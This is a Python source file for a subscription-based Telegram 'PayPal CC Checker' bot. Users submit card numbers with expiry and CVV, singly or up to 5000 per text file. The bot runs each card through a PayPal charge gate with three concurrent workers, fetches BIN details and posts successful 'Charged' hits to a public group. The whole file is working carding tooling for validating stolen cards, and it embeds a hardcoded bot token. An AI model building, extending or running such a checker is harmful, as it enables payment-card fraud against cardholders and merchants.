import os    
import re    
import json    
import time    
import threading    
import telebot    
from datetime import datetime, timedelta    
from telebot import types    
import requests    
from concurrent.futures import ThreadPoolExecutor # Added for concurrency

from pp import pp    

BOT_TOKEN = "8581247361:AAFZhk_iInthUVuA3rY0Cr-kETxatjjNKXA"    
OWNER_ID = [6181269269]  # Owner IDs    
DARKS_ID = 6181269269    

# YOUR SPECIFIC GROUP ID HERE - Public Group ID  
HIT_GROUP_ID = -1002081863152  # Your provided group ID (converted to negative format)  

bot = telebot.TeleBot(BOT_TOKEN)    

SUBS_FILE = "subscriptions.json"    
USER_AMOUNTS_FILE = "user_amounts.json"    
BOT_START_TIME = time.time()    

default_amount = "0.01"    

# Global variables define karo sabse upar    
final_message = ""  # Initialize empty string    
lock = threading.Lock()  # For thread-safe operations    

def load_json(file_path, default_data):    
    if os.path.exists(file_path):    
        try:    
            with open(file_path, 'r') as f:    
                return json.load(f)    
        except Exception as e:    
            print(f"JSON load error: {e}")    
            return default_data    
    return default_data    

def save_json(file_path, data):    
    with open(file_path, 'w') as f:    
        json.dump(data, f, indent=2)    

subscriptions = load_json(SUBS_FILE, {})    
user_amounts = load_json(USER_AMOUNTS_FILE, {})    

status_emoji = {    
    'Your order is ready.': '🔥',    
    'DECLINED': '❌',    
    'EXPIRED': '👋',    
    'ERROR': '⚠️'    
}    

status_text = {    
    'Your order is ready.': '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥',    
    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌',    
    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝 👋',    
    'ERROR': '𝐄𝐫𝐫𝐨𝐫 ⚠️'    
}    

def is_owner(user_id):    
    return user_id in OWNER_ID    

def is_subscribed(user_id):    
    user_id = str(user_id)    
    if user_id in subscriptions:    
        expiry_time = datetime.fromisoformat(subscriptions[user_id]['expiry'])    
        if datetime.now() < expiry_time:    
            return True    
        else:    
            del subscriptions[user_id]    
            save_json(SUBS_FILE, subscriptions)    
    return False    

def add_subscription(user_id, hours):    
    user_id = str(user_id)    
    expiry_time = datetime.now() + timedelta(hours=hours)    
    subscriptions[user_id] = {    
        'expiry': expiry_time.isoformat(),    
        'added': datetime.now().isoformat(),    
        'hours': hours    
    }    
    save_json(SUBS_FILE, subscriptions)    
    return expiry_time    

def get_user_amount(user_id):    
    user_id = str(user_id)    
    return user_amounts.get(user_id, default_amount)    

def set_user_amount(user_id, amount):    
    user_id = str(user_id)    
    user_amounts[user_id] = amount    
    save_json(USER_AMOUNTS_FILE, user_amounts)    

def extract_cc(text):    
    cleaned = re.sub(r'[^\d|:./ ]', '', text)    
    parts = [] 
        
    if '|' in cleaned:    
        parts = cleaned.split('|')    
    elif ':' in cleaned:    
        parts = cleaned.split(':')    
    elif '.' in cleaned:    
        parts = cleaned.split('.')    
    elif '/' in cleaned:    
        parts = cleaned.split('/')    
    else:    
        if len(cleaned) >= 16:    
            cc = cleaned[:16]    
            rest = cleaned[16:]    
            if len(rest) >= 4:    
                mm = rest[:2]    
                rest = rest[2:]    
                if len(rest) >= 4:    
                    yyyy = rest[:4] if len(rest) >= 4 else rest[:2]    
                    rest = rest[4:] if len(rest) >= 4 else rest[2:]    
                    if len(rest) >= 3:    
                        cvv = rest[:3]    
                        parts = [cc, mm, yyyy, cvv]    
        
    if len(parts) < 4:    
        return None    
        
    cc = parts[0].strip()    
    mm = parts[1].strip().zfill(2)    
    yyyy = parts[2].strip()    
    cvv = parts[3].strip()    
        
    if len(yyyy) == 2:    
        current_year_short = datetime.now().year % 100    
        year_int = int(yyyy)    
        yyyy = f"20{yyyy}" if year_int >= current_year_short else f"19{yyyy}"    
        
    return f"{cc}|{mm}|{yyyy}|{cvv}"    

def extract_multiple_ccs(text):    
    lines = re.split(r'[\n\r,;]+', text)    
    ccs = []
    for line in lines:    
        cc = extract_cc(line)    
        if cc:    
            ccs.append(cc)    
    return ccs    

def get_bin_info(card_number):    
    card_number = re.sub(r'\D', '', card_number)    
    if len(card_number) < 6:    
        return None    
    bin_code = card_number[:6]    
    try:    
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=5)    
        if response.status_code == 200:    
            return response.json()    
    except Exception as e:    
        print(f"BIN lookup error: {e}")    
    return None    

def send_hit_detection_message(cc, amount, user_id, user_name, response_text):  
    try:  
        safe_name = str(user_name).replace("<", "").replace(">", "")  
        user_mention = f'<a href="tg://user?id={user_id}">{safe_name}</a>'  
          
        hit_message = f"""⩙ 𝑯𝒊𝒕 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 ↬ 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 🔥    
⊀ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ #Paypal_Charge    
⊀ 𝐏𝐫𝐢𝐜𝐞 ↬ ${amount}    
⊀ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↬ {response_text} 🔥    
⌬ 𝐔𝐬𝐞𝐫 ↬ {user_id}    
⌬ 𝐇𝐢𝐭 𝐅𝐫𝐨𝐦 ↬ {user_mention}"""  
          
        bot.send_message(HIT_GROUP_ID, hit_message, parse_mode='HTML', disable_web_page_preview=True)  
        return True  
    except Exception as e:  
        print(f"Hit message error: {e}")
        return False  

def format_final_message(cc, response_text, status, amount, bin_info, user_id, full_name, time_taken):    
    if response_text == "INSUFFICIENT_FUNDS":    
        emoji = '💰'    
        status_msg = 'Approved ❎'    
    elif response_text == "Your order is ready.":    
        emoji = '🔥'    
        status_msg = '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥'    
    elif status in status_emoji:    
        emoji = status_emoji.get(status)    
        status_msg = status_text.get(status)    
    else:    
        emoji = '❌'    
        status_msg = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'    
        
    if bin_info:    
        card_info = bin_info.get('brand', 'UNKNOWN') + ' ' + bin_info.get('type', 'UNKNOWN')    
        issuer = bin_info.get('bank', 'UNKNOWN')    
        country = bin_info.get('country_name', 'UNKNOWN')    
        flag = bin_info.get('country_flag', '🇺🇳')    
    else:    
        card_info = 'UNKNOWN'    
        issuer = 'UNKNOWN'    
        country = 'UNKNOWN'    
        flag = '🇺🇳'    
        
    safe_name = full_name.replace("<", "").replace(">", "")    
    user_mention = f'<a href="tg://user?id={user_id}">{safe_name}</a>'    
        
    message = f"""#Paypal_Charge (${amount}) 🌩[/pp]      
- - - - - - - - - - - - - - - - - - - - - -    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐂𝐚𝐫𝐝</strong>↣<code>{cc}</code>    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐀𝐦𝐨𝐮𝐧𝐭</strong>↣${amount}    
- - - - - - - - - - - - - - - - - - - - - -    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐒𝐭𝐚𝐭𝐮𝐬:</strong> {status_msg}    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</strong>↣ <code>{response_text}</code> {emoji}    
- - - - - - - - - - - - - - - - - - - - - -    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐁𝐫𝐚𝐧𝐝</strong>↣{card_info}    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐁𝐚𝐧𝐤</strong>↣{issuer}    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</strong>↣{country} {flag}    
- - - - - - - - - - - - - - - - - - - - - -    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲</strong>↣ {user_mention}    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong>↣ <a href="tg://user?id={DARKS_ID}">DANI - 🍀</a>    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐓𝐢𝐦𝐞</strong>↣ {time_taken} <strong>𝐬𝐞𝐜𝐨𝐧𝐝𝐬</strong>"""    
    return message    

@bot.message_handler(commands=['start', 'help'])    
def send_welcome(message):    
    user_id = str(message.from_user.id)    
        
    if is_owner(message.from_user.id):    
        role = "👑 Owner"    
    elif is_subscribed(message.from_user.id):    
        user_data = subscriptions.get(user_id, {})
        expiry_str = user_data.get('expiry')
        if expiry_str:
            expiry = datetime.fromisoformat(expiry_str)    
            remaining = expiry - datetime.now()    
            hours_left = int(remaining.total_seconds() / 3600)    
            role = f"✅ Subscriber ({hours_left}h remaining)"    
        else:
            role = "✅ Subscriber"
    else:    
        role = "❌ No Subscription"    
        
    help_text = f"""Welcome to PayPal CC Checker Bot!    
    
👤<strong>Your Status:</strong>{role}    
💰<strong>Your Amount:</strong>${get_user_amount(user_id)}    
    
Available Commands:    
• /pp CC|MM|YYYY|CVV - Check a single card    
• /set_amo - Set your donation amount    
• /mysub - Check your subscription status    
    
Examples:    
/pp 4242424242424242|12|2026|123    
/pp 5121079824995770|01|2028|990    
    
<strong>Note:</strong>You need an active subscription to use this bot."""    
    bot.send_message(message.chat.id, help_text, parse_mode='HTML')    

@bot.message_handler(commands=['pp'])    
def handle_pp_check(message):    
    thread = threading.Thread(target=process_pp_check, args=(message,))    
    thread.start()    

def process_pp_check(message):    
    user_id = str(message.from_user.id)    
        
    if not is_owner(message.from_user.id) and not is_subscribed(user_id):    
        bot.reply_to(message, "❌<strong>Subscription Required!</strong>\n\nYou need an active subscription to use this bot.", parse_mode='HTML')    
        return    
        
    cc_text = None    
    if message.text.startswith('/pp'):    
        parts = message.text.split(maxsplit=1)    
        if len(parts) > 1:    
            cc_text = parts[1]    
        
    if not cc_text and message.reply_to_message:    
        cc_text = message.reply_to_message.text    
        
    if not cc_text:    
        bot.reply_to(message, "Please provide a CC in format: /pp CC|MM|YYYY|CVV")    
        return    
        
    cc = extract_cc(cc_text)    
    if not cc:    
        bot.reply_to(message, "Invalid CC format. Please use CC|MM|YYYY|CVV")    
        return    
        
    processing_msg = bot.reply_to(message, "𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐂𝐚𝐫𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 🔥")    
        
    card_number = cc.split('|')[0]    
    bin_info = get_bin_info(card_number)    
    amount = get_user_amount(user_id)    
    start_time = time.time()    
        
    response_text, status = pp(cc, amount)    
    time_taken = round(time.time() - start_time, 2)    
        
    first = message.from_user.first_name or ""    
    last = message.from_user.last_name or ""    
    full_name = f"{first} {last}".strip()    
        
    final_msg = format_final_message(cc, response_text, status, amount, bin_info, message.from_user.id, full_name, time_taken)    
    bot.send_message(message.chat.id, final_msg, parse_mode='HTML')    
        
    if response_text == "Your order is ready.":    
        send_hit_detection_message(cc, amount, message.from_user.id, full_name, response_text)    
        
    bot.delete_message(message.chat.id, processing_msg.message_id)    

@bot.message_handler(content_types=['document'])    
def handle_document(message):    
    user_id = str(message.from_user.id)    
        
    if not is_owner(message.from_user.id) and not is_subscribed(user_id):    
        bot.reply_to(message, "❌<strong>Subscription Required!</strong>\n\nYou need an active subscription to use this bot.", parse_mode='HTML')    
        return    
        
    if message.document and message.document.file_name.endswith('.txt'):    
        try:    
            file_info = bot.get_file(message.document.file_id)    
            downloaded_file = bot.download_file(file_info.file_path)    
                
            temp_file = f"temp_{user_id}_{int(time.time())}.txt"    
            with open(temp_file, 'wb') as f:    
                f.write(downloaded_file)    
                
            with open(temp_file, 'r', encoding='utf-8') as f:    
                file_content = f.read()    
                
            os.remove(temp_file)    
            ccs = extract_multiple_ccs(file_content)    
                
            if not ccs:    
                bot.reply_to(message, "❌ No valid CCs found in the file.")    
                return    
                
            if len(ccs) > 5000:    
                ccs = ccs[:5000]    
                bot.reply_to(message, f"⚠️ Limited to 5000 cards.")    
                
            thread = threading.Thread(target=process_file_check, args=(message, ccs, user_id))    
            thread.start()    
                
        except Exception as e:    
            bot.reply_to(message, f"❌ Error reading file: {str(e)}")    
    else:    
        bot.reply_to(message, "❌ Please send a .txt file only.")    

stop_checking_global = {}    

def process_file_check(message, ccs, user_id):    
    amount = get_user_amount(user_id)    
    hh = bot.reply_to(message, "<b>- Please Wait Checking Your Cards - At Gate (#paypa_custom)...</b>", parse_mode='HTML').message_id    
        
    stats = {'charged': 0, 'declined': 0, 'low_funds': 0, 'checked': 0}
    total = len(ccs)    
    stop_checking_global[hh] = False    
    first = message.from_user.first_name or ""    
    last = message.from_user.last_name or ""    
    full_name = f"{first} {last}".strip()    
    
    # Thread Lock for shared counters
    stats_lock = threading.Lock()

    def check_card_worker(cc):
        if stop_checking_global.get(hh, False):
            return

        start_time = time.time()
        try:
            response_text, status = pp(cc, amount)
            time_taken = round(time.time() - start_time, 2)

            with stats_lock:
                stats['checked'] += 1
                if response_text == "Your order is ready.":
                    stats['charged'] += 1
                    send_hit_detection_message(cc, amount, user_id, full_name, response_text)
                elif response_text == "INSUFFICIENT_FUNDS":
                    stats['low_funds'] += 1
                else:
                    stats['declined'] += 1

                # Update Progress every 2 cards to avoid Telegram flooding
                if stats['checked'] % 2 == 0 or stats['checked'] == total:
                    card_preview = cc.split('|')[0][:6] + "******" + cc.split('|')[0][-4:]
                    key = types.InlineKeyboardMarkup(row_width=1)
                    key.add(
                        types.InlineKeyboardButton(f"- {card_preview} -", callback_data='h'),
                        types.InlineKeyboardButton(f"- Response : {response_text} -", callback_data='h'),
                        types.InlineKeyboardButton(f"- Charged 🔥 : {stats['charged']} -", callback_data='h'),
                        types.InlineKeyboardButton(f"- Declined ❌ : {stats['declined']} -", callback_data='h'),
                        types.InlineKeyboardButton(f"- Low Funds 💰 : {stats['low_funds']} -", callback_data='h'),
                        types.InlineKeyboardButton(f"- Total : {stats['checked']}/{total} -", callback_data='h'),
                        types.InlineKeyboardButton("- Stop Check Cards ! -", callback_data=f'stop_{hh}')
                    )
                    bot.edit_message_text("<b>- Please Wait Checking Your Cards - At Gate (#paypa_custom)...</b>", 
                                         chat_id=message.chat.id, message_id=hh, reply_markup=key, parse_mode='HTML')

                # Send individual result for hits
                if response_text == "Your order is ready." or response_text == "INSUFFICIENT_FUNDS":
                    bin_info = get_bin_info(cc.split('|')[0])
                    final_msg = format_final_message(cc, response_text, status, amount, bin_info, user_id, full_name, time_taken)
                    bot.send_message(message.chat.id, final_msg, parse_mode='HTML')

        except Exception as e:
            with stats_lock:
                stats['checked'] += 1
                stats['declined'] += 1

    # Start Concurrent Workers (Max 3)
    with ThreadPoolExecutor(max_workers=3) as executor:
        executor.map(check_card_worker, ccs)
        
    if not stop_checking_global.get(hh, False):    
        final_stats = f"""<b>✅ File Check Completed!</b>    
    
📊 <strong>Final Results:</strong>    
━━━━━━━━━━━━━━━━━━━    
• Total Cards: {total}    
• Charged 🔥: {stats['charged']}    
• Low Funds 💰: {stats['low_funds']}    
• Declined ❌: {stats['declined']}    
━━━━━━━━━━━━━━━━━━━    
[<a href="https://t.me/danivipgc">⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong>↣ <a href="tg://user?id={DARKS_ID}">DANI - 🍀</a>"""    
        bot.edit_message_text(text=final_stats, chat_id=message.chat.id, message_id=hh, parse_mode='HTML')    

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))    
def stop_callback(call):    
    try:    
        msg_id = int(call.data.split('_')[1])    
        stop_checking_global[msg_id] = True    
        bot.answer_callback_query(call.id, "Stopping check...")    
        bot.edit_message_text(text="<b>❌ Check stopped by user!</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')    
    except Exception as e:    
        bot.answer_callback_query(call.id, f"Error: {e}")    

@bot.message_handler(commands=['set_amo'])    
def handle_set_amount(message):    
    user_id = str(message.from_user.id)    
    current_amount = get_user_amount(user_id)    
    markup = types.ForceReply(selective=True)    
    bot.send_message(message.chat.id, f"💰<strong>Set Your Donation Amount</strong>\n\nCurrent Amount:<strong>${current_amount}</strong>\n\nPlease enter the new amount:", parse_mode='HTML', reply_markup=markup)    

@bot.message_handler(func=lambda m: m.reply_to_message and m.reply_to_message.from_user.id == bot.get_me().id and "Set Your Donation Amount" in m.reply_to_message.text)    
def handle_amount_reply(message):    
    user_id = str(message.from_user.id)    
    try:    
        amount = message.text.strip()    
        float(amount) # Validate
        set_user_amount(user_id, amount)    
        bot.reply_to(message, f"✅ Amount updated!\nNew Amount:<strong>${amount}</strong>", parse_mode='HTML')    
    except:    
        bot.reply_to(message, "❌ Invalid amount!", parse_mode='HTML')    

@bot.message_handler(commands=['sub'])    
def handle_add_subscription(message):    
    if not is_owner(message.from_user.id):    
        bot.reply_to(message, "❌ Owner Only!")    
        return    
    parts = message.text.split()    
    if len(parts) != 3:    
        bot.reply_to(message, "Usage: /sub <user_id> <hours>")    
        return    
    try:    
        expiry_time = add_subscription(parts[1], int(parts[2]))    
        bot.reply_to(message, f"✅ Subscription added for {parts[1]}!")    
    except Exception as e:    
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['mysub'])    
def handle_my_subscription(message):    
    user_id = str(message.from_user.id)    
    if is_owner(message.from_user.id):    
        bot.reply_to(message, "👑<strong>Owner</strong>", parse_mode='HTML')    
        return    
    if is_subscribed(user_id):    
        expiry = datetime.fromisoformat(subscriptions[user_id]['expiry'])    
        hours_left = int((expiry - datetime.now()).total_seconds() / 3600)    
        bot.reply_to(message, f"✅ Active Subscription\n⏳Remaining:{hours_left}h\n💰Amount:${get_user_amount(user_id)}", parse_mode='HTML')    
    else:    
        bot.reply_to(message, "❌ No Active Subscription", parse_mode='HTML')    

if __name__ == "__main__":    
    print("🤖 Bot started")    
    bot.infinity_polling()